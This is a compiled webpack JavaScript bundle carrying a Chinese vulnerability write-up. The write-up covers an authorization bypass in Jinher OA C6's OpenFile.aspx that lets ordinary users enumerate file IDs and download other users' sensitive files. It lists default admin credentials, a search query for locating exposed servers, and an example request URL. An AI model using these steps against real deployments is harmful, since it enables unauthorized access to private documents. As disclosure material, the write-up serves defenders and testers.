(window.webpackJsonp=window.webpackJsonp||[]).push([[20],{1560:function(s,t,a){s.exports=a.p+"assets/img/jh-5.e7d86edd.png"},1561:function(s,t,a){s.exports=a.p+"assets/img/jh-6.5492eabb.png"},1562:function(s,t,a){s.exports=a.p+"assets/img/jh-7.86330166.png"},1563:function(s,t,a){s.exports=a.p+"assets/img/jh-8.33f3db03.png"},1564:function(s,t,a){s.exports=a.p+"assets/img/jh-9.d81d6328.png"},1565:function(s,t,a){s.exports=a.p+"assets/img/jh-10.72a1cea1.png"},1566:function(s,t,a){s.exports=a.p+"assets/img/jh-12.986d3338.png"},1567:function(s,t,a){s.exports=a.p+"assets/img/jh-11.21b6be23.png"},1568:function(s,t,a){s.exports=a.p+"assets/img/jh-13.c01c3c65.png"},2448:function(s,t,a){"use strict";a.r(t);var e=a(75),r=Object(e.a)({},(function(){var s=this,t=s.$createElement,e=s._self._c||t;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"金和oa-c6-openfile-aspx-后台越权敏感文件遍历漏洞"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#金和oa-c6-openfile-aspx-后台越权敏感文件遍历漏洞"}},[s._v("#")]),s._v(" 金和OA C6 OpenFile.aspx 后台越权敏感文件遍历漏洞")]),s._v(" "),e("h2",{attrs:{id:"漏洞描述"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),e("p",[s._v("金和OA C6 存在后台越权敏感文件遍历漏洞，普通用户通过遍历特殊参数可以获取其他用户上传的敏感文件")]),s._v(" "),e("h2",{attrs:{id:"漏洞影响"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v("金和OA C6")]),e("br"),s._v(" "),e("h2",{attrs:{id:"网络测绘"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v('app="Jinher-OA"')]),e("br"),s._v(" "),e("h2",{attrs:{id:"漏洞复现"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),e("p",[s._v("默认用户口令：admin/000000")]),s._v(" "),e("p",[s._v("登录后点击信息交流，发起协同页面")]),s._v(" "),e("p",[e("img",{attrs:{src:a(1560),alt:"img"}})]),s._v(" "),e("p",[s._v("上传附件并上传发送给目标，这里登录权限为管理员，我们自己发给自己就好，前文只是展现漏洞挖掘思路过程")]),s._v(" "),e("p",[e("img",{attrs:{src:a(1561),alt:"img"}})]),s._v(" "),e("p",[s._v("成功收到上传的附件")]),s._v(" "),e("p",[e("img",{attrs:{src:a(1562),alt:"img"}})]),s._v(" "),e("p",[s._v("点击查看时抓包，发现一个带有文件ID的请求包")]),s._v(" "),e("p",[e("img",{attrs:{src:a(1563),alt:"img"}})]),s._v(" "),e("p",[s._v("返回了几个参数")]),s._v(" "),e("div",{staticClass:"language-plain line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-plain"}},[e("code",[s._v("var strFilePath = '../Resource/slaves/1/8b473ecb-7b39-4384-ada2-b0ec72c4f6ed.png';\nvar strFileType = 'png';\nvar strSid='3jvpvhs410m2wdbbficax5q5';\nvar strFileIDCode='us9w7xWE7do=';\nvar strId = '1229';\nvar strTxtReg = 'txt,ini,xml,config,htm,html,js,css,asp,aspx,jsp,cs,sql,inf,htc,log';\nvar strImgReg = 'jpg,gif,jpeg,png,ico';\nvar MD = '';\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br")])]),e("p",[s._v("其中我们注意到 strFilePath 为文件的存储地址，我们更改 id参数为另一个值，且测试后发现 name文件名参数无关紧要")]),s._v(" "),e("p",[e("img",{attrs:{src:a(1564),alt:"img"}})]),s._v(" "),e("p",[s._v("更改ID后发送请求包发现获得另一个文件的信息")]),s._v(" "),e("p",[s._v("访问Url，注意 "),e("strong",[s._v("type参数")]),s._v("  需要为正确的文件后缀才可以访问")]),s._v(" "),e("div",{staticClass:"language-plain line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-plain"}},[e("code",[s._v("http://xxx.xxx.xxx.xxx/C6/control/OpenFile.aspx?id=1200&name=&type=pdf\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:a(1565),alt:"img"}})]),s._v(" "),e("p",[s._v("这里更换一个普通用户测试是否可行，尝试遍历 id")]),s._v(" "),e("p",[e("img",{attrs:{src:a(1566),alt:"img"}})]),s._v(" "),e("p",[e("img",{attrs:{src:a(1567),alt:"img"}})]),s._v(" "),e("p",[s._v("存在 "),e("strong",[s._v("strFilePath参数")]),s._v(" 则是存在文件，为空则是文件已经不存在")]),s._v(" "),e("p",[s._v("同时抓包下载文件页面也可以看到可获取的参数")]),s._v(" "),e("p",[e("strong",[s._v("FileID 与 FileIDCode")])]),s._v(" "),e("p",[e("img",{attrs:{src:a(1568),alt:"img"}})]),s._v(" "),e("p",[s._v("于是只需要通过刚刚的ID遍历，获取两个关键参数就能下载其他人发送的敏感文件，且只需要普通用户权限")])],1)}),[],!1,null,null,null);t.default=r.exports}}]);